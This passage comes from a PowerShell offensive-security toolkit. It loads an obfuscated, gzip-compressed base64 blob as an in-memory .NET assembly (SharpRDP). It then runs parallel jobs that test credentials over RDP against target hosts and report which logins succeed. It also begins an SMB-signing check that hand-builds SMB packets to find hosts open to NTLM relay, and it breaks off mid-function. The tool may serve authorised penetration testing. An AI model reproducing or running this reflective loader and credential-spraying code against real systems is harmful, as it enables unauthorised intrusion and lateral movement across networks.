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"))
    $decompressed = New-Object IO.Compression.GzipStream($a,[IO.Compression.CoMPressionMode]::DEComPress)
    $output = New-Object System.IO.MemoryStream
    $decompressed.CopyTo( $output )
    [byte[]] $byteOutArray = $output.ToArray()
    $RAS = [System.Reflection.Assembly]::Load($byteOutArray)
    $OldConsoleOut = [Console]::Out
    $StringWriter = New-Object IO.StringWriter
    [Console]::SetOut($StringWriter)

    [SharpRDP.Program]::Main($Command.Split(" "))

    [Console]::SetOut($OldConsoleOut)
    $Results = $StringWriter.ToString()
    $Results
}

IF ($LocalAuth){$Domain = $ComputerName}
IF ($Password -ne ""){$output = Invoke-SharpRDP -Command "username=$Domain\$Username password=$Password computername=$ComputerName command='hostname'"}

    if ($output | Select-String "Connected to" -CaseSensitive:$false) {
            
            Write-Host "RDP " -ForegroundColor "Yellow" -NoNewline
            Write-Host "   " -NoNewline
            
            try {$Ping = New-Object System.Net.NetworkInformation.Ping
            $IP = $($Ping.Send("$ComputerName").Address).IPAddressToString
            Write-Host ("{0,-16}" -f $IP) -NoNewline}
            catch { Write-Host ("{0,-16}" -f "") -NoNewline}
            
            Write-Host "   " -NoNewline
            Write-Host ("{0,-$NameLength}" -f $ComputerName) -NoNewline
            Write-Host "   " -NoNewline
            Write-Host ("{0,-$OSLength}" -f $OS) -NoNewline
            Write-Host "   " -NoNewline
            Write-Host "[+] " -ForegroundColor "Green" -NoNewline
            Write-Host "SUCCESS"

    } 

    elseif ($output | Select-String "SSL_ERR_PASSWORD_MUST_CHANGE" -CaseSensitive:$false) {

            Write-Host "RDP " -ForegroundColor "Yellow" -NoNewline
            Write-Host "   " -NoNewline
            
            try {$Ping = New-Object System.Net.NetworkInformation.Ping
            $IP = $($Ping.Send("$ComputerName").Address).IPAddressToString
            Write-Host ("{0,-16}" -f $IP) -NoNewline}
            catch { Write-Host ("{0,-16}" -f "") -NoNewline}
            
            Write-Host "   " -NoNewline
            Write-Host ("{0,-$NameLength}" -f $ComputerName) -NoNewline
            Write-Host "   " -NoNewline
            Write-Host ("{0,-$OSLength}" -f $OS) -NoNewline
            Write-Host "   " -NoNewline
            Write-Host "[*] " -ForegroundColor "Magenta" -NoNewline
            Write-Host "Password Change Required"
    }

    elseif ($output | Select-String "Connection closed" -CaseSensitive:$false) {

            Write-Host "RDP " -ForegroundColor "Yellow" -NoNewline
            Write-Host "   " -NoNewline
            
            try {$Ping = New-Object System.Net.NetworkInformation.Ping
            $IP = $($Ping.Send("$ComputerName").Address).IPAddressToString
            Write-Host ("{0,-16}" -f $IP) -NoNewline}
            catch { Write-Host ("{0,-16}" -f "") -NoNewline}
            
            Write-Host "   " -NoNewline
            Write-Host ("{0,-$NameLength}" -f $ComputerName) -NoNewline
            Write-Host "   " -NoNewline
            Write-Host ("{0,-$OSLength}" -f $OS) -NoNewline
            Write-Host "   " -NoNewline
            Write-Host "[-] " -ForegroundColor "Red" -NoNewline
            Write-Host "ACCESS DENIED"

    }
    
    Else {

            Write-Host "RDP " -ForegroundColor "Yellow" -NoNewline
            Write-Host "   " -NoNewline
            
            try {$Ping = New-Object System.Net.NetworkInformation.Ping
            $IP = $($Ping.Send("$ComputerName").Address).IPAddressToString
            Write-Host ("{0,-16}" -f $IP) -NoNewline}
            catch { Write-Host ("{0,-16}" -f "") -NoNewline}
            
            Write-Host "   " -NoNewline
            Write-Host ("{0,-$NameLength}" -f $ComputerName) -NoNewline
            Write-Host "   " -NoNewline
            Write-Host ("{0,-$OSLength}" -f $OS) -NoNewline
            Write-Host "   " -NoNewline
            Write-Host "[-] " -ForegroundColor "Red" -NoNewline
            Write-Host "ACCESS DENIED"
    } 


        }}

            while (($RDPJobs | Where-Object { $_.State -eq 'Running' }).Count -ge $MaxConcurrentJobs) {
            Start-Sleep -Milliseconds 500
}

$RDPJob = Start-Job -ScriptBlock $ScriptBlock -ArgumentList $OS, $ComputerName, $Domain, $Username, $Password, $NameLength, $OSLength, $LocalAuth
        [array]$RDPJobs += $RDPJob

        # Check if the maximum number of concurrent jobs has been reached
        if ($RDPJobs.Count -ge $MaxConcurrentJobs) {
            do {
                # Wait for any job to complete
                $JobFinished = $null
                foreach ($Job in $RDPJobs) {
                    if ($Job.State -eq 'Completed') {
                        $JobFinished = $Job
                        break
                    }
                }

                if ($JobFinished) {
                    # Retrieve the job result and remove it from the job list
                    $Result = Receive-Job -Job $JobFinished
                    # Process the result as needed
                    $Result

                    $RDPJobs = $RDPJobs | Where-Object { $_ -ne $JobFinished }
                    Remove-Job -Job $JobFinished -Force -ErrorAction SilentlyContinue
                }
            }
            until (-not $JobFinished)
        }
    }

    # Wait for any remaining jobs to complete
    $RDPJobs | ForEach-Object {
        $JobFinished = $_ | Wait-Job -Timeout 100

        if ($JobFinished) {
            # Retrieve the job result and remove it from the job list
            $Result = Receive-Job -Job $JobFinished
            # Process the result as needed
            $Result

            Remove-Job -Job $JobFinished -Force -ErrorAction SilentlyContinue
        }
    }

    # Clean up all remaining jobs
    $RDPJobs | Remove-Job -Force -ErrorAction SilentlyContinue
}

################################################################################################################
############################################# Function: GenRelayList ###########################################
################################################################################################################
Function Get-SMBSigning  {

Param (
    [String]$Target,
    [String[]]$Targets=@(),
    [Float]$Delay,
    [Float]$DelayJitter
    ) 

    #borrowed from https://github.com/Kevin-Robertson/Inveigh/blob/master/Scripts/Inveigh-Relay.ps1
    function ConvertFrom-PacketOrderedDictionary
    {
        param($packet_ordered_dictionary)

        ForEach($field in $packet_ordered_dictionary.Values)
        {
            $byte_array += $field
        }

        return $byte_array
    }

    #NetBIOS

    function Get-PacketNetBIOSSessionService()
    {
        param([Int]$packet_header_length,[Int]$packet_data_length)

        [Byte[]]$packet_netbios_session_service_length = [System.BitConverter]::GetBytes($packet_header_length + $packet_data_length)
        $packet_NetBIOS_session_service_length = $packet_netbios_session_service_length[2..0]

        $packet_NetBIOSSessionService = New-Object System.Collections.Specialized.OrderedDictionary
        $packet_NetBIOSSessionService.Add("NetBIOSSessionService_Message_Type",[Byte[]](0x00))
        $packet_NetBIOSSessionService.Add("NetBIOSSessionService_Length",[Byte[]]($packet_netbios_session_service_length))

        return $packet_NetBIOSSessionService
    }

    #SMB1

    function Get-PacketSMBHeader()
    {
        param([Byte[]]$packet_command,[Byte[]]$packet_flags,[Byte[]]$packet_flags2,[Byte[]]$packet_tree_ID,[Byte[]]$packet_process_ID,[Byte[]]$packet_user_ID)

        $packet_SMBHeader = New-Object System.Collections.Specialized.OrderedDictionary
        $packet_SMBHeader.Add("SMBHeader_Protocol",[Byte[]](0xff,0x53,0x4d,0x42))
        $packet_SMBHeader.Add("SMBHeader_Command",$packet_command)
        $packet_SMBHeader.Add("SMBHeader_ErrorClass",[Byte[]](0x00))
        $packet_SMBHeader.Add("SMBHeader_Reserved",[Byte[]](0x00))
        $packet_SMBHeader.Add("SMBHeader_ErrorCode",[Byte[]](0x00,0x00))
        $packet_SMBHeader.Add("SMBHeader_Flags",$packet_flags)
        $packet_SMBHeader.Add("SMBHeader_Flags2",$packet_flags2)
        $packet_SMBHeader.Add("SMBHeader_ProcessIDHigh",[Byte[]](0x00,0x00))
        $packet_SMBHeader.Add("SMBHeader_Signature",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
        $packet_SMBHeader.Add("SMBHeader_Reserved2",[Byte[]](0x00,0x00))
        $packet_SMBHeader.Add("SMBHeader_TreeID",$packet_tree_ID)
        $packet_SMBHeader.Add("SMBHeader_ProcessID",$packet_process_ID)
        $packet_SMBHeader.Add("SMBHeader_UserID",$packet_user_ID)
        $packet_SMBHeader.Add("SMBHeader_MultiplexID",[Byte[]](0x00,0x00))

        return $packet_SMBHeader
    }

    function Get-PacketSMBNegotiateProtocolRequest()
    {
        param([String]$packet_version)

        if($packet_version -eq 'SMB1')
        {
            [Byte[]]$packet_byte_count = 0x0c,0x00
        }
        else
        {
            [Byte[]]$packet_byte_count = 0x22,0x00  
        }

        $packet_SMBNegotiateProtocolRequest = New-Object System.Collections.Specialized.OrderedDictionary
        $packet_SMBNegotiateProtocolRequest.Add("SMBNegotiateProtocolRequest_WordCount",[Byte[]](0x00))
        $packet_SMBNegotiateProtocolRequest.Add("SMBNegotiateProtocolRequest_ByteCount",$packet_byte_count)
        $packet_SMBNegotiateProtocolRequest.Add("SMBNegotiateProtocolRequest_RequestedDialects_Dialect_BufferFormat",[Byte[]](0x02))
        $packet_SMBNegotiateProtocolRequest.Add("SMBNegotiateProtocolRequest_RequestedDialects_Dialect_Name",[Byte[]](0x4e,0x54,0x20,0x4c,0x4d,0x20,0x30,0x2e,0x31,0x32,0x00))

        if($packet_version -ne 'SMB1')
        {
            $packet_SMBNegotiateProtocolRequest.Add("SMBNegotiateProtocolRequest_RequestedDialects_Dialect_BufferFormat2",[Byte[]](0x02))
            $packet_SMBNegotiateProtocolRequest.Add("SMBNegotiateProtocolRequest_RequestedDialects_Dialect_Name2",[Byte[]](0x53,0x4d,0x42,0x20,0x32,0x2e,0x30,0x30,0x32,0x00))
            $packet_SMBNegotiateProtocolRequest.Add("SMBNegotiateProtocolRequest_RequestedDialects_Dialect_BufferFormat3",[Byte[]](0x02))
            $packet_SMBNegotiateProtocolRequest.Add("SMBNegotiateProtocolRequest_RequestedDialects_Dialect_Name3",[Byte[]](0x53,0x4d,0x42,0x20,0x32,0x2e,0x3f,0x3f,0x3f,0x00))
        }

        return $packet_SMBNegotiateProtocolRequest
    }

    function Get-PacketSMBSessionSetupAndXRequest()
    {
        param([Byte[]]$packet_security_blob)

        [Byte[]]$packet_byte_count = [System.BitConverter]::GetBytes($packet_security_blob.Length)
        $packet_byte_count = $packet_byte_count[0,1]
        [Byte[]]$packet_security_blob_length = [System.BitConverter]::GetBytes($packet_security_blob.Length + 5)
        $packet_security_blob_length = $packet_security_blob_length[0,1]

        $packet_SMBSessionSetupAndXRequest = New-Object System.Collections.Specialized.OrderedDictionary
        $packet_SMBSessionSetupAndXRequest.Add("SMBSessionSetupAndXRequest_WordCount",[Byte[]](0x0c))
        $packet_SMBSessionSetupAndXRequest.Add("SMBSessionSetupAndXRequest_AndXCommand",[Byte[]](0xff))
        $packet_SMBSessionSetupAndXRequest.Add("SMBSessionSetupAndXRequest_Reserved",[Byte[]](0x00))
        $packet_SMBSessionSetupAndXRequest.Add("SMBSessionSetupAndXRequest_AndXOffset",[Byte[]](0x00,0x00))
        $packet_SMBSessionSetupAndXRequest.Add("SMBSessionSetupAndXRequest_MaxBuffer",[Byte[]](0xff,0xff))
        $packet_SMBSessionSetupAndXRequest.Add("SMBSessionSetupAndXRequest_MaxMpxCount",[Byte[]](0x02,0x00))
        $packet_SMBSessionSetupAndXRequest.Add("SMBSessionSetupAndXRequest_VCNumber",[Byte[]](0x01,0x00))
        $packet_SMBSessionSetupAndXRequest.Add("SMBSessionSetupAndXRequest_SessionKey",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SMBSessionSetupAndXRequest.Add("SMBSessionSetupAndXRequest_SecurityBlobLength",$packet_byte_count)
        $packet_SMBSessionSetupAndXRequest.Add("SMBSessionSetupAndXRequest_Reserved2",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SMBSessionSetupAndXRequest.Add("SMBSessionSetupAndXRequest_Capabilities",[Byte[]](0x44,0x00,0x00,0x80))
        $packet_SMBSessionSetupAndXRequest.Add("SMBSessionSetupAndXRequest_ByteCount",$packet_security_blob_length)
        $packet_SMBSessionSetupAndXRequest.Add("SMBSessionSetupAndXRequest_SecurityBlob",$packet_security_blob)
        $packet_SMBSessionSetupAndXRequest.Add("SMBSessionSetupAndXRequest_NativeOS",[Byte[]](0x00,0x00,0x00))
        $packet_SMBSessionSetupAndXRequest.Add("SMBSessionSetupAndXRequest_NativeLANManage",[Byte[]](0x00,0x00))

        return $packet_SMBSessionSetupAndXRequest 
    }

    function Get-PacketSMBTreeConnectAndXRequest()
    {
        param([Byte[]]$packet_path)

        [Byte[]]$packet_path_length = [System.BitConverter]::GetBytes($packet_path.Length + 7)
        $packet_path_length = $packet_path_length[0,1]

        $packet_SMBTreeConnectAndXRequest = New-Object System.Collections.Specialized.OrderedDictionary
        $packet_SMBTreeConnectAndXRequest.Add("SMBTreeConnectAndXRequest_WordCount",[Byte[]](0x04))
        $packet_SMBTreeConnectAndXRequest.Add("SMBTreeConnectAndXRequest_AndXCommand",[Byte[]](0xff))
        $packet_SMBTreeConnectAndXRequest.Add("SMBTreeConnectAndXRequest_Reserved",[Byte[]](0x00))
        $packet_SMBTreeConnectAndXRequest.Add("SMBTreeConnectAndXRequest_AndXOffset",[Byte[]](0x00,0x00))
        $packet_SMBTreeConnectAndXRequest.Add("SMBTreeConnectAndXRequest_Flags",[Byte[]](0x00,0x00))
        $packet_SMBTreeConnectAndXRequest.Add("SMBTreeConnectAndXRequest_PasswordLength",[Byte[]](0x01,0x00))
        $packet_SMBTreeConnectAndXRequest.Add("SMBTreeConnectAndXRequest_ByteCount",$packet_path_length)
        $packet_SMBTreeConnectAndXRequest.Add("SMBTreeConnectAndXRequest_Password",[Byte[]](0x00))
        $packet_SMBTreeConnectAndXRequest.Add("SMBTreeConnectAndXRequest_Tree",$packet_path)
        $packet_SMBTreeConnectAndXRequest.Add("SMBTreeConnectAndXRequest_Service",[Byte[]](0x3f,0x3f,0x3f,0x3f,0x3f,0x00))

        return $packet_SMBTreeConnectAndXRequest
    }

    function Get-PacketSMBNTCreateAndXRequest()
    {
        param([Byte[]]$packet_named_pipe)

        [Byte[]]$packet_named_pipe_length = [System.BitConverter]::GetBytes($packet_named_pipe.Length)
        $packet_named_pipe_length = $packet_named_pipe_length[0,1]
        [Byte[]]$packet_file_name_length = [System.BitConverter]::GetBytes($packet_named_pipe.Length - 1)
        $packet_file_name_length = $packet_file_name_length[0,1]

        $packet_SMBNTCreateAndXRequest = New-Object System.Collections.Specialized.OrderedDictionary
        $packet_SMBNTCreateAndXRequest.Add("SMBNTCreateAndXRequest_WordCount",[Byte[]](0x18))
        $packet_SMBNTCreateAndXRequest.Add("SMBNTCreateAndXRequest_AndXCommand",[Byte[]](0xff))
        $packet_SMBNTCreateAndXRequest.Add("SMBNTCreateAndXRequest_Reserved",[Byte[]](0x00))
        $packet_SMBNTCreateAndXRequest.Add("SMBNTCreateAndXRequest_AndXOffset",[Byte[]](0x00,0x00))
        $packet_SMBNTCreateAndXRequest.Add("SMBNTCreateAndXRequest_Reserved2",[Byte[]](0x00))
        $packet_SMBNTCreateAndXRequest.Add("SMBNTCreateAndXRequest_FileNameLen",$packet_file_name_length)
        $packet_SMBNTCreateAndXRequest.Add("SMBNTCreateAndXRequest_CreateFlags",[Byte[]](0x16,0x00,0x00,0x00))
        $packet_SMBNTCreateAndXRequest.Add("SMBNTCreateAndXRequest_RootFID",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SMBNTCreateAndXRequest.Add("SMBNTCreateAndXRequest_AccessMask",[Byte[]](0x00,0x00,0x00,0x02))
        $packet_SMBNTCreateAndXRequest.Add("SMBNTCreateAndXRequest_AllocationSize",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
        $packet_SMBNTCreateAndXRequest.Add("SMBNTCreateAndXRequest_FileAttributes",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SMBNTCreateAndXRequest.Add("SMBNTCreateAndXRequest_ShareAccess",[Byte[]](0x07,0x00,0x00,0x00))
        $packet_SMBNTCreateAndXRequest.Add("SMBNTCreateAndXRequest_Disposition",[Byte[]](0x01,0x00,0x00,0x00))
        $packet_SMBNTCreateAndXRequest.Add("SMBNTCreateAndXRequest_CreateOptions",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SMBNTCreateAndXRequest.Add("SMBNTCreateAndXRequest_Impersonation",[Byte[]](0x02,0x00,0x00,0x00))
        $packet_SMBNTCreateAndXRequest.Add("SMBNTCreateAndXRequest_SecurityFlags",[Byte[]](0x00))
        $packet_SMBNTCreateAndXRequest.Add("SMBNTCreateAndXRequest_ByteCount",$packet_named_pipe_length)
        $packet_SMBNTCreateAndXRequest.Add("SMBNTCreateAndXRequest_Filename",$packet_named_pipe)

        return $packet_SMBNTCreateAndXRequest
    }

    function Get-PacketSMBReadAndXRequest()
    {
        $packet_SMBReadAndXRequest = New-Object System.Collections.Specialized.OrderedDictionary
        $packet_SMBReadAndXRequest.Add("SMBReadAndXRequest_WordCount",[Byte[]](0x0a))
        $packet_SMBReadAndXRequest.Add("SMBReadAndXRequest_AndXCommand",[Byte[]](0xff))
        $packet_SMBReadAndXRequest.Add("SMBReadAndXRequest_Reserved",[Byte[]](0x00))
        $packet_SMBReadAndXRequest.Add("SMBReadAndXRequest_AndXOffset",[Byte[]](0x00,0x00))
        $packet_SMBReadAndXRequest.Add("SMBReadAndXRequest_FID",[Byte[]](0x00,0x40))
        $packet_SMBReadAndXRequest.Add("SMBReadAndXRequest_Offset",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SMBReadAndXRequest.Add("SMBReadAndXRequest_MaxCountLow",[Byte[]](0x58,0x02))
        $packet_SMBReadAndXRequest.Add("SMBReadAndXRequest_MinCount",[Byte[]](0x58,0x02))
        $packet_SMBReadAndXRequest.Add("SMBReadAndXRequest_Unknown",[Byte[]](0xff,0xff,0xff,0xff))
        $packet_SMBReadAndXRequest.Add("SMBReadAndXRequest_Remaining",[Byte[]](0x00,0x00))
        $packet_SMBReadAndXRequest.Add("SMBReadAndXRequest_ByteCount",[Byte[]](0x00,0x00))

        return $packet_SMBReadAndXRequest
    }

    function Get-PacketSMBWriteAndXRequest()
    {
        param([Byte[]]$packet_file_ID,[Int]$packet_RPC_length)

        [Byte[]]$packet_write_length = [System.BitConverter]::GetBytes($packet_RPC_length)
        $packet_write_length = $packet_write_length[0,1]

        $packet_SMBWriteAndXRequest = New-Object System.Collections.Specialized.OrderedDictionary
        $packet_SMBWriteAndXRequest.Add("SMBWriteAndXRequest_WordCount",[Byte[]](0x0e))
        $packet_SMBWriteAndXRequest.Add("SMBWriteAndXRequest_AndXCommand",[Byte[]](0xff))
        $packet_SMBWriteAndXRequest.Add("SMBWriteAndXRequest_Reserved",[Byte[]](0x00))
        $packet_SMBWriteAndXRequest.Add("SMBWriteAndXRequest_AndXOffset",[Byte[]](0x00,0x00))
